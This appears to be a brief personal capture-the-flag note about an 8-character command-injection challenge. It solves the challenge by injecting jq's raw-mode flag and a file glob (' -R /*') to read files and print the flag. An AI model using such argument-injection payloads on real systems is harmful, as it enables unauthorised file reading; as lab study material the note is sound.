---
created: 2024-06-22T18:48
updated: 2024-06-22T18:49
---

Command injection, except I can't use commands, because its 8 char max.

Well jq has a raw mode `-R`, so we will use that

```
' -R /*'
"FLAG{jqj6jqjqjqjqjqj6jqjqjqjqj6jqjqjq}"
```
